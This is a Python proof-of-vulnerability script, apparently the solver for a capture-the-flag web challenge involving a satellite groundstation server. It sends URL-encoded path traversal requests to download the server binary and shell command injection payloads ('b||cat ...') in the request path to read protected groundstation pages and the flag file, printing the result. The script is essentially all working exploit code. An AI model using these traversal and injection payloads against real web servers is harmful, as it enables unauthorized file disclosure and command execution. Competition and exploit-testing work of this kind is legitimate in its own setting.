#!/usr/bin/env python3

import requests
import sys
import os
from bs4 import BeautifulSoup

import logging


HOST = os.getenv('HOST', 'localhost')
PORT = os.getenv('PORT', '8080')

if len(sys.argv) == 3:

    HOST = sys.argv[1]
    PORT = sys.argv[2]
    

BASE_URI = 'http://' + HOST + ':' + PORT + '/'

logging.getLogger().setLevel(10)
logging.getLogger("urllib3.connectionpool").setLevel(50)

def get_webroot():

    logging.info("Doing the GET of the webserver root")

    headers = {'User-Agent': 'My POV tool' }

    try:
        response1 = requests.get(BASE_URI + "/index.html", headers=headers)

    except:

        logging.critical("unable to connect to webserver on host {}".format(HOST))
        sys.exit(-1)

    if response1.status_code != 200:

        logging.fatal("bad response for retrieving /index.html")
        sys.exit(-1)


def get_webserver():

    logging.info("Doing the GET of the webserver binary")

    headers = {'User-Agent': 'My POV tool' }

    try:
        response1 = requests.get(BASE_URI + "%2E%2E/%2E%2E/has3-web", headers=headers)

    except:

        logging.critical("unable to connect to webserver on host {}".format(HOST))
        sys.exit(-1)

    if response1.status_code != 200:

        logging.fatal("bad response for retrieving the webserver binary")
        sys.exit(-1)

def get_sciencestationdata():

    logging.info("Doing the GET of the Science Groundstation html")

    headers = {'User-Agent': 'webserver POV tool' }

    response1 = requests.get(BASE_URI + "b%7c%7ccat%20www/html/groundstations/index_science-station.html/", headers=headers)

    if response1.status_code != 200:

        logging.fatal("bad response for retrieving the Science Station data")
        sys.exit(-1)

    # soup = BeautifulSoup(response1.content, 'html.parser')
    # print(soup.prettify())

def get_flag():

    logging.info("Doing the GET of the flag file")

    headers = {'User-Agent': 'My POV flag getter' }

    response1 = requests.get(BASE_URI + "b%7c%7ccat%20www/html/flag/flag.txt/", headers=headers)

    if len(response1.content) == 0:

        logging.fatal("Did not get the flag file")
        sys.exit(-1)

    print(response1.content)


# start by testing that the webserver is up and functioning
get_webroot()

# first getting the server binary allows you to reverse engineer it
get_webserver()

# but the actual prize is exercising the weaknesses to bypass auth and get groundstation data
get_sciencestationdata()

# and of course the flag!
get_flag()



logging.info("success :)")
